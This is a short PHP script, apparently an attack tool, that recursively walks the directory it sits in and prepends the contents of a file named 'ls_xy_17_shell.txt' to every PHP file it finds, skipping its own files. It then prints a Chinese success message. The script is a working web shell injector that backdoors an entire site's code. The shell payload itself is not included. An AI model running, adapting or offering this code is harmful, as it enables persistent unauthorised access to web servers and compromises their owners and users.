<?php




function reWritePHP( $file ){

    $shell = file_get_contents( "./ls_xy_17_shell.txt" ) ;

    $content = file_get_contents( $file ) ;

    file_put_contents( $file , $shell . "\n\n\n\n\n" . $content ) ;

}






function isPHPFile( $file ){

    $arr = explode( "." , $file ) ;

    $count = count( $arr ) ;

    if( $count > 0 && strpos( $file , "ls_xy_17" ) === FALSE && strtolower( $arr[ $count - 1 ] ) === 'php' ){

        return TRUE ;
    }

    return FALSE ;
}


function myScan( $file ){

    if( is_dir( $file ) ){

        $file_arr = scandir( $file ) ;

        foreach ( $file_arr as $key => $value ){

            if( $value !== '.' && $value !== '..' ){

                myScan( $file . DIRECTORY_SEPARATOR . $value ) ;
            }
        }

    }
    else{

        if( isPHPFile( $file ) ){

            reWritePHP( $file ) ;
        }
    }

}


try{

    myScan( dirname( __FILE__ ) ) ;

    echo "<h2 style='color:rgb(91,184,93);text-align:center;margin:27px auto ; padding:100px 0;'>OK ! 操作成功</h2>" ;

}catch ( Exception $e ){

    echo "<h2 style='color:rgb(217,84,79);text-align:center;margin:27px auto ; padding:100px 0;'>操作失败了 : " . $e -> getMessage() . "</h2>" ;
}





